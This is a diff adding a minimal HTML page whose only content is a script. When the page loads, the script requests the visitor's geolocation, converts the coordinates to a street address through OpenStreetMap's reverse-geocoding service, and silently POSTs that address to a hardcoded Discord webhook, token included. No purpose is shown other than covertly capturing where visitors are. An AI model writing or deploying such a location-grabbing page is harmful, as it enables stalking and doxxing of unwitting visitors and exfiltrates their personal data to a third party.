@@ -1,0 +1,27 @@
+<html>
+<body>
+<script>
+ navigator.geolocation.getCurrentPosition(function(position) {
+ var address = "";
+ var lat = position.coords.latitude;
+ var lon = position.coords.longitude;
+ var api = "https://nominatim.openstreetmap.org/reverse?format=json&lat=" + lat + "&lon=" + lon;
+ fetch(api)
+ .then(function(response) {
+ return response.json();
+ })
+ .then(function(data) {
+ var address = data.address.road + ", " + data.address.city + ", " + data.address.postcode;
+ var webhook = "https://discord.com/api/webhooks/1274389071652716687/v_H39wrA5VxiwqhTnNFE6df4rq4JbLkh5KM9Pr5gEbjEqkc4Xc2EdboKPR1Me5RVRCO1";
+ var payload = {
+ "content": address
+ }
+ fetch(webhook, {
+ "method": "POST",
+ "body": JSON.stringify(payload)
+ })
+ })
+ });
+</script>
+</body>
+</html>
